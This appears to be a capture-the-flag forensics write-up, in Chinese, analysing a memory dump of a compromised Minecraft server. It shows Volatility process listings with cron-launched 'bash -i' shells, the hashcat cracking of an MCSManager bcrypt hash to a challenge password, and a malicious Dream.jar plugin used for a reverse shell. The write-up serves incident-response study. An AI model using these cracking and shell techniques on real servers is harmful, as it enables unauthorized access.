+<h4 id="请寻找蛤客zym进入了与Minecraft相关的什么程序"><a href="#请寻找蛤客zym进入了与Minecraft相关的什么程序" class="headerlink" title="请寻找蛤客zym进入了与Minecraft相关的什么程序?"></a>请寻找蛤客zym进入了与Minecraft相关的什么程序?</h4><p>本题做法不唯一</p>
+<p>使用linux_psaux收集进程及其完整命令行，linux_getcwd列出每个进程的当前工作目录，linux_netstat列出打开的套接字连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2 vol.py -f mem.mem --profile=Linux4_9_0-deepin13-amd64x64 linux_psaux<br>Volatility Foundation Volatility Framework 2.6.1<br>Pid    Uid    Gid    Arguments<br>1      0      0      ����]�<br>                           �]�<br>                              ���<br>2      0      0      [kthreadd]<br>3      0      0      [ksoftirqd/0]<br>5      0      0      [kworker/0:0H]<br>7      0      0      [rcu_preempt]<br>8      0      0      [rcu_sched]<br>9      0      0      [rcu_bh]<br>10     0      0      [migration/0]<br>11     0      0      [lru-add-drain]<br>12     0      0      [watchdog/0]<br>13     0      0      [cpuhp/0]<br>14     0      0      [cpuhp/1]<br>15     0      0      [watchdog/1]<br>16     0      0      [migration/1]<br>17     0      0      [ksoftirqd/1]<br>19     0      0      [kworker/1:0H]<br>20     0      0      [kdevtmpfs]<br>21     0      0      [netns]<br>22     0      0      [khungtaskd]<br>23     0      0      [oom_reaper]<br>24     0      0      [writeback]<br>25     0      0      [kcompactd0]<br>26     0      0      [ksmd]<br>28     0      0      [khugepaged]<br>29     0      0      [crypto]<br>30     0      0      [kintegrityd]<br>31     0      0      [bioset]<br>32     0      0      [kblockd]<br>34     0      0      [devfreq_wq]<br>35     0      0      [watchdogd]<br>36     0      0      [kswapd0]<br>37     0      0      [vmstat]<br>49     0      0      [kthrotld]<br>50     0      0      [ipv6_addrconf]<br>93     0      0      [ata_sff]<br>94     0      0      [scsi_eh_0]<br>95     0      0      [scsi_tmf_0]<br>96     0      0      [scsi_eh_1]<br>97     0      0      [scsi_tmf_1]<br>99     0      0      [ttm_swap]<br>106    0      0      [mpt_poll_0]<br>109    0      0      [mpt/0]<br>130    0      0      [bioset]<br>132    0      0      [scsi_eh_2]<br>133    0      0      [scsi_tmf_2]<br>134    0      0      [bioset]<br>149    0      0      [kworker/1:1H]<br>154    0      0      [kworker/0:1H]<br>159    0      0      [md]<br>181    0      0      [raid5wq]<br>204    0      0      [bioset]<br>232    0      0      [jbd2/sda1-8]<br>233    0      0      [ext4-rsv-conver]<br>272    0      0      /lib/systemd/systemd-journald<br>274    0      0      [kauditd]<br>282    0      0      /sbin/lvmetad -f<br>287    0      0      [kworker/1:3]<br>291    0      0      /lib/systemd/systemd-udevd<br>333    0      0      vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid<br>370    0      0      /usr/bin/vmtoolsd<br>372    100    102    /lib/systemd/systemd-timesyncd<br>374    0      0      /usr/bin/VGAuthService<br>375    0      0      /usr/lib/accountsservice/accounts-daemon<br>377    0      0      /opt/node-v16.20.2-linux-x64/bin/node app.js<br>378    115    121    avahi-daemon: running [nOo<br>379    0      0      /usr/sbin/ModemManager<br>381    105    108    /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation<br>382    115    121    avahi-daemon: <span class="hljs-built_in">chroot</span> helpe<br>393    0      0      /usr/sbin/NetworkManager --no-daemon<br>394    0      0      /opt/node-v16.20.2-linux-x64/bin/node app.js<br>395    0      0      /lib/systemd/systemd-logind<br>397    0      0      /usr/sbin/cupsd -l<br>403    0      0      /usr/lib/policykit-1/polkitd --no-debug<br>404    0      0      [nfit]<br>411    0      0      /usr/bin/lastore-daemon<br>432    0      0      /usr/sbin/lightdm<br>457    0      0      /usr/lib/xorg/Xorg -core :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch<br>477    0      0      /sbin/dhclient -d -q -sf /usr/lib/NetworkManager/nm-dhcp-helper -pf /run/dhclient-ens33.pid -lf /var/lib/NetworkManager/dhclient-a497ca06-b1ec-3100-89a0-d6fd53c872fe-ens33.lease -cf /var/lib/NetworkManager/dhclient-ens33.conf ens33<br>509    0      0      /usr/lib/ipsec/starter --daemon charon --nofork<br>533    0      0      /usr/lib/ipsec/charon<br>534    0      0      /usr/sbin/nmbd<br>554    0      0      /usr/sbin/smbd<br>555    0      0      /usr/sbin/smbd<br>556    0      0      /usr/sbin/smbd<br>559    0      0      /usr/sbin/smbd<br>597    0      0      /usr/lib/deepin-daemon/dde-lockservice<br>603    0      0      /usr/lib/deepin-daemon/dde-system-daemon<br>627    0      0      lightdm --session-child 13 20<br>803    1000   1000   /lib/systemd/systemd --user<br>804    1000   1000   (sd-pam)<br>810    1000   1000   /usr/bin/gnome-keyring-daemon --daemonize --login<br>812    1000   1000   /usr/bin/startdde<br>839    1000   1000   dbus-launch --autolaunch 74f093796e6d485da000334c25d41c2a --binary-syntax --close-stderr<br>840    1000   1000   /usr/bin/dbus-daemon --fork --print-pid 5 --print-address 7 --session<br>875    1000   1000   /usr/bin/dbus-launch --exit-with-session --sh-syntax<br>876    1000   1000   /usr/bin/dbus-daemon --fork --print-pid 5 --print-address 7 --session<br>894    1000   1000   /usr/bin/ssh-agent /usr/bin/sogou-session /usr/bin/im-launch /usr/bin/startdde<br>898    1000   1000   /usr/bin/fcitx<br>919    1000   1000   /usr/bin/dbus-daemon --fork --print-pid 5 --print-address 7 --config-file /usr/share/fcitx/dbus/daemon.conf<br>925    1000   1000   /usr/bin/fcitx-dbus-watcher unix:abstract=/tmp/dbus-JLBxsmGy51,guid=dd3761f7f0570becdbf860b26820ea27 919<br>947    1000   1000   /usr/bin/pulseaudio --start --log-target=syslog<br>956    1000   1000   /usr/lib/gvfs/gvfsd<br>964    1000   1000   /usr/lib/gvfs/gvfsd-fuse /run/user/1000/gvfs -f -o big_writes<br>978    1000   1000   /usr/lib/x86_64-linux-gnu/gconf/gconfd-2<br>991    1000   1000   sogou-qimpanel-watchdog<br>992    1000   1000   /usr/lib/deepin-notifications/deepin-notifications<br>993    1000   1000   /usr/lib/deepin-daemon/dde-session-initializer<br>994    1000   1000   /usr/bin/dde-desktop<br>995    1000   1000   /usr/bin/deepin-wm-switcher<br>1042   1000   1000   /usr/bin/deepin-metacity --replace<br>1043   1000   1000   /usr/bin/dde-dock<br>1149   1000   1000   /usr/lib/gvfs/gvfs-udisks2-volume-monitor<br>1152   0      0      /usr/lib/udisks2/udisksd --no-debug<br>1160   1000   1000   /usr/lib/gvfs/gvfs-mtp-volume-monitor<br>1170   1000   1000   /usr/lib/gvfs/gvfs-gphoto2-volume-monitor<br>1175   1000   1000   /usr/lib/gvfs/gvfs-afc-volume-monitor<br>1181   1000   1000   /usr/lib/gvfs/gvfs-goa-volume-monitor<br>1213   1000   1000   /usr/lib/deepin-daemon/dde-session-daemon<br>1214   1000   1000   /usr/bin/dde-file-manager -d<br>1306   0      0      [cfg80211]<br>1310   1000   1000   /usr/lib/polkit-1-dde/dde-polkit-agent<br>1316   1000   1000   /usr/lib/deepin-daemon/deepin-cloud-print-agent<br>1322   1000   1000   /usr/bin/dde-file-manager -f<br>1326   1000   1000   /usr/bin/deepin-menu<br>1328   1000   1000   /usr/bin/lastore-session-helper<br>1339   1000   1000   /usr/bin/vmtoolsd -n vmusr --blockFd 3<br>1402   1000   1000   /usr/lib/flatpak/flatpak-session-helper<br>1410   1000   1000   /usr/lib/flatpak/xdg-document-portal<br>1423   1000   1000   /usr/lib/flatpak/xdg-permission-store<br>1514   1000   1000   /bin/bash /usr/lib/x86_64-linux-gnu/bamf/bamfdaemon-dbus-runner<br>1515   1000   1000   /usr/lib/x86_64-linux-gnu/bamf/bamfdaemon<br>1542   0      0      /usr/bin/dde-file-manager-daemon<br>1563   1000   1000   /usr/lib/deepin-daemon/dde-osd<br>1580   1000   1000   sogou-qimpanel<br>1641   1000   1000   /usr/bin/python3 /usr/share/system-config-printer/applet.py<br>1701   1000   1000   /usr/lib/deepin-api/mousearea<br>2440   1000   1000   /usr/lib/gvfs/gvfsd-trash --spawner :1.12 /org/gtk/gvfs/exec_spaw/0<br>2449   1000   1000   /usr/lib/gvfs/gvfsd-network --spawner :1.12 /org/gtk/gvfs/exec_spaw/1<br>2455   1000   1000   /usr/lib/gvfs/gvfsd-smb-browse --spawner :1.12 /org/gtk/gvfs/exec_spaw/2<br>2462   0      0      /usr/sbin/smbd<br>2464   1000   1000   /usr/lib/dconf/dconf-service<br>2469   1000   1000   /usr/lib/gvfs/gvfsd-dnssd --spawner :1.12 /org/gtk/gvfs/exec_spaw/3<br>31061  0      0      [kworker/u256:2]<br>47489  0      0      /usr/sbin/cron -f<br>48999  0      0      /usr/sbin/CRON -f<br>49002  0      0      /bin/sh -c /purpur-1.20.4/shell<br>49003  0      0      /bin/bash /purpur-1.20.4/shell<br>49004  0      0      bash -i<br>49436  0      0      /usr/sbin/CRON -f<br>49439  0      0      /bin/sh -c /purpur-1.20.4/shell<br>49440  0      0      /bin/bash /purpur-1.20.4/shell<br>49441  0      0      bash -i<br>50091  0      0      /usr/sbin/CRON -f<br>50094  0      0      /bin/sh -c /purpur-1.20.4/shell<br>50095  0      0      /bin/bash /purpur-1.20.4/shell<br>50096  0      0      bash -i<br>50102  0      0      python3 -m http.server 80<br>52790  1000   1000   deepin-terminal<br>52805  1000   1000   /bin/bash<br>53276  1000   1000   file-roller /purpur-1.20.4/plugins/eBackup/backups/eBackup 2025-05-12 02-40-00.zip<br>53283  1000   1000   /usr/lib/xdg-desktop-portal/xdg-desktop-portal<br>53289  1000   1000   /usr/lib/xdg-desktop-portal/xdg-desktop-portal-gtk<br>53327  0      0      /opt/mcsmanager/daemon/lib/pty_linux_x64 -size 164,40 -coder utf8 -<span class="hljs-built_in">dir</span> /purpur-1.20.4/ -fifo /tmp/mcsmanager-instance-pipe/pipe-fbeca537-38ac-4336-a259-6b1a37d6d2af -cmd [<span class="hljs-string">&quot;java&quot;</span>,<span class="hljs-string">&quot;-jar&quot;</span>,<span class="hljs-string">&quot;-Djava.awt.headless=true&quot;</span>,<span class="hljs-string">&quot;-DGeyserSkinManager.ForceShowSkins=true&quot;</span>,<span class="hljs-string">&quot;-Xms128M&quot;</span>,<span class="hljs-string">&quot;-Xmx768M&quot;</span>,<span class="hljs-string">&quot;purpur-1.20.4-2176.jar&quot;</span>]<br>53331  0      0      /usr/bin/java -jar -Djava.awt.headless=<span class="hljs-literal">true</span> -DGeyserSkinManager.ForceShowSkins=<span class="hljs-literal">true</span> -Xms128M -Xmx768M purpur-1.20.4-2176.jar<br>54010  0      0      <span class="hljs-built_in">sudo</span> su<br>54192  0      0      su<br>54193  0      0      bash<br>54207  0      0      [kworker/u256:1]<br>54211  0      0      vmhgfs-fuse .host:/ /mnt/hgfs/<br>54759  0      0      insmod ./lime-4.9.0-deepin13-amd64.ko path=/mnt/hgfs/share/mem.mem format=lime<br>55705  0      0      [kworker/1:2]<br>-31233381 -1     -1     [ Vde?q\gT =????]<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2 vol.py -f mem.mem --profile=Linux4_9_0-deepin13-amd64x64 linux_getcwd<br>Name              Pid      CWD<br>----------------- -------- ---<br>systemd                  1<br>kthreadd                 2<br>ksoftirqd/0              3<br>kworker/0:0H             5<br>rcu_preempt              7<br>rcu_sched                8<br>rcu_bh                   9<br>migration/0             10<br>lru-add-drain           11<br>watchdog/0              12<br>cpuhp/0                 13<br>cpuhp/1                 14<br>watchdog/1              15<br>migration/1             16<br>ksoftirqd/1             17<br>kworker/1:0H            19<br>kdevtmpfs               20<br>netns                   21<br>khungtaskd              22<br>oom_reaper              23<br>writeback               24<br>kcompactd0              25<br>ksmd                    26<br>khugepaged              28<br>crypto                  29<br>kintegrityd             30<br>bioset                  31<br>kblockd                 32<br>devfreq_wq              34<br>watchdogd               35<br>kswapd0                 36<br>vmstat                  37<br>kthrotld                49<br>ipv6_addrconf           50<br>ata_sff                 93<br>scsi_eh_0               94<br>scsi_tmf_0              95<br>scsi_eh_1               96<br>scsi_tmf_1              97<br>ttm_swap                99<br>mpt_poll_0             106<br>mpt/0                  109<br>bioset                 130<br>scsi_eh_2              132<br>scsi_tmf_2             133<br>bioset                 134<br>kworker/1:1H           149<br>kworker/0:1H           154<br>md                     159<br>raid5wq                181<br>bioset                 204<br>jbd2/sda1-8            232<br>ext4-rsv-conver        233<br>systemd-journal        272<br>kauditd                274<br>lvmetad                282<br>kworker/1:3            287<br>systemd-udevd          291<br>vmware-vmblock-        333<br>vmtoolsd               370<br>systemd-timesyn        372<br>VGAuthService          374<br>accounts-daemon        375<br>node                   377 /opt/mcsmanager/web<br>avahi-daemon           378<br>ModemManager           379<br>dbus-daemon            381<br>avahi-daemon           382<br>NetworkManager         393<br>node                   394 /opt/mcsmanager/daemon<br>systemd-logind         395<br>cupsd                  397<br>polkitd                403<br>nfit                   404<br>lastore-daemon         411<br>lightdm                432<br>Xorg                   457<br>dhclient               477<br>starter                509<br>charon                 533<br>nmbd                   534<br>smbd                   554<br>smbd-notifyd           555<br>cleanupd               556<br>lpqd                   559<br>dde-lockservice        597<br>dde-system-daem        603<br>lightdm                627<br>systemd                803<br>(sd-pam)               804<br>gnome-keyring-d        810<br>startdde               812 /home/n0<br>dbus-launch            839<br>dbus-daemon            840<br>dbus-launch            875<br>dbus-daemon            876<br>ssh-agent              894<br>fcitx                  898<br>dbus-daemon            919<br>fcitx-dbus-watc        925<br>pulseaudio             947<br>gvfsd                  956<br>gvfsd-fuse             964<br>gconfd-2               978<br>sogou-qimpanel-        991<br>deepin-notifica        992 /home/n0<br>dde-session-ini        993 /home/n0<br>dde-desktop            994 /home/n0/Desktop<br>deepin-wm-switc        995 /home/n0<br>deepin-metacity       1042 /home/n0<br>dde-dock              1043 /usr/bin<br>gvfs-udisks2-vo       1149<br>udisksd               1152<br>gvfs-mtp-volume       1160<br>gvfs-gphoto2-vo       1170<br>gvfs-afc-volume       1175<br>gvfs-goa-volume       1181<br>dde-session-dae       1213 /home/n0<br>dde-file-manage       1214 /home/n0<br>cfg80211              1306<br>dde-polkit-agen       1310 /home/n0<br>deepin-cloud-pr       1316 /home/n0<br>dde-file-manage       1322 /home/n0<br>deepin-menu           1326 /home/n0<br>lastore-session       1328 /home/n0<br>vmtoolsd              1339 /home/n0<br>flatpak-session       1402<br>xdg-document-po       1410<br>xdg-permission-       1423<br>bamfdaemon-dbus       1514<br>bamfdaemon            1515<br>dde-file-manage       1542<br>dde-osd               1563 /home/n0<br>sogou-qimpanel        1580<br>applet.py             1641 /home/n0<br>mousearea             1701<br>gvfsd-trash           2440<br>gvfsd-network         2449<br>gvfsd-smb-brows       2455<br>smbd                  2462 /tmp<br>dconf-service         2464<br>gvfsd-dnssd           2469<br>kworker/u256:2       31061<br>cron                 47489 /var/spool/cron<br>cron                 48999 /var/spool/cron<br>sh                   49002 /root<br>shell                49003 /root<br>bash                 49004 /home/n0/Downloads<br>cron                 49436 /var/spool/cron<br>sh                   49439 /root<br>shell                49440 /root<br>bash                 49441 /root<br>cron                 50091 /var/spool/cron<br>sh                   50094 /root<br>shell                50095 /root<br>bash                 50096 /root<br>python3              50102<br>deepin-terminal      52790 /home/n0/Desktop<br>bash                 52805 /home/n0/Desktop<br>file-roller          53276 /home/n0<br>xdg-desktop-por      53283<br>xdg-desktop-por      53289<br>pty_linux_x64        53327 /purpur-1.20.4<br>java                 53331 /purpur-1.20.4<br><span class="hljs-built_in">sudo</span>                 54010 /home/n0/Desktop<br>su                   54192 /home/n0/Desktop<br>bash                 54193 /usr/local/src/LiME-1.9.1/src<br>kworker/u256:1       54207<br>vmhgfs-fuse          54211<br>insmod               54759 /usr/local/src/LiME-1.9.1/src<br>kworker/1:2          55705<br> Vde?q\gT =????  -31...81<br></code></pre></td></tr></table></figure>
+
+<p>根据服务器运行日志或Chatty日志可知服务器安装了面板</p>
+<p>linux_bash恢复的bash历史记录中可以看见尝试了重启mcsm面板服务</p>
+<p>linux_netstat发现mcsm默认的23333 24444端口存在连接，可判断安装的是mcsm面板</p>
+<p>linux_psaux列出的进程及其完整命令行可以看见mcsm面板安装于&#x2F;opt&#x2F;mcsmanager&#x2F;，同时可以看见启动命令等</p>
+<p>linux_getcwd也可以看见mcsm面板的启动位置</p>
+<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">Q2 Answer</span><span class="hljs-punctuation">:</span> <span class="hljs-string">mcsmanager</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="蛤客zym进入与Minecraft相关的程序使用的用户名和密码是什么"><a href="#蛤客zym进入与Minecraft相关的程序使用的用户名和密码是什么" class="headerlink" title="蛤客zym进入与Minecraft相关的程序使用的用户名和密码是什么?"></a>蛤客zym进入与Minecraft相关的程序使用的用户名和密码是什么?</h4><p>根据服务器运行日志或Chatty日志可知服务器安装了面板，密码是rockyou.txt中Aa开头加数字，这个信息不用的话也能知道，只是多爆一下罢了，cmd5也是能查到的</p>
+<p><img src="../../../../img/archives/MiniVN2025/image-20251208223411422.png" srcset="/img/loading.gif" lazyload alt="image-20251208223411422"></p>
+<p>从官网可以直接查到用户相关的数据的默认位置在&#x2F;opt&#x2F;mcsmanager&#x2F;web&#x2F;data，然后进入User文件夹就可以找到用户数据</p>
+<p><img src="../../../../img/archives/MiniVN2025/image-20251208223511354.png" srcset="/img/loading.gif" lazyload alt="image-20251208223511354"></p>
+<p>这边也可以直接在mcsmanager这个文件夹所有的文件中查找password</p>
+<p><img src="../../../../img/archives/MiniVN2025/image-20251208223800149.png" srcset="/img/loading.gif" lazyload alt="image-20251208223800149"></p>
+<p><img src="../../../../img/archives/MiniVN2025/image-20251208223558999.png" srcset="/img/loading.gif" lazyload alt="image-20251208223558999"></p>
+<p>得到这段bcrypt哈希后，使用hashcat和rockyou进行爆破得到密码</p>
+<p><img src="../../../../img/archives/MiniVN2025/image-20251208224234033.png" srcset="/img/loading.gif" lazyload alt="image-20251208224234033"></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">Q3 Answer: nOo0b,Aa<span class="hljs-number">123456789</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="请从蛤客zym的入侵痕迹找出他通过上传了什么得到了shell"><a href="#请从蛤客zym的入侵痕迹找出他通过上传了什么得到了shell" class="headerlink" title="请从蛤客zym的入侵痕迹找出他通过上传了什么得到了shell?"></a>请从蛤客zym的入侵痕迹找出他通过上传了什么得到了shell?</h4><p>其实此题确实有些表述不清，shell这个文件也是上传且用到了，应该问上传了什么程序并利用其反弹shell的</p>
+<p>对服务器日志进行分析发现W4ngXunF1sh执行了shell命令，同时执行后服务器出现了异常，分析可以发现执行反弹shell命令后，服务器主线程被Dream.jar插件卡死。堆栈显示在处理玩家聊天事件时主线程阻塞，Purpur看门狗连续报警未响应，随后服务器自动重启。</p>
+<p>据此信息进行寻找并查看前几个服务器日志，发现在之前plugins文件夹中上传了一个新插件Dream.jar，并重启了游戏服务器</p>
+<p><img src="../../../../img/archives/MiniVN2025/image-20251208224621859.png" srcset="/img/loading.gif" lazyload alt="image-20251208224621859"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs log">[03:47:48] [Watchdog Thread/ERROR]: ------------------------------<br>[03:47:48] [Watchdog Thread/ERROR]: --- DO NOT REPORT THIS TO PURPUR - THIS IS NOT A BUG OR A CRASH ---<br>[03:47:48] [Watchdog Thread/ERROR]: ------------------------------<br>[03:47:53] [Watchdog Thread/ERROR]: --- DO NOT REPORT THIS TO PURPUR - THIS IS NOT A BUG OR A CRASH  - git-Purpur-2176 (MC: 1.20.4) ---<br>[03:47:53] [Watchdog Thread/ERROR]: The server has not responded for 50 seconds! Creating thread dump<br>[03:47:53] [Watchdog Thread/ERROR]: ------------------------------<br>[03:47:53] [Watchdog Thread/ERROR]: Server thread dump (Look for plugins here before reporting to Purpur!):<br>[03:47:53] [Watchdog Thread/ERROR]: ------------------------------<br>[03:47:53] [Watchdog Thread/ERROR]: Current Thread: Server thread<br>[03:47:53] [Watchdog Thread/ERROR]: 	PID: 33 | Suspended: false | Native: true | State: RUNNABLE<br>[03:47:53] [Watchdog Thread/ERROR]: 	Stack:<br>[03:47:53] [Watchdog Thread/ERROR]: 		java.base@21.0.7/java.io.FileInputStream.readBytes(Native Method)<br>[03:47:53] [Watchdog Thread/ERROR]: 		java.base@21.0.7/java.io.FileInputStream.read(FileInputStream.java:287)<br>[03:47:53] [Watchdog Thread/ERROR]: 		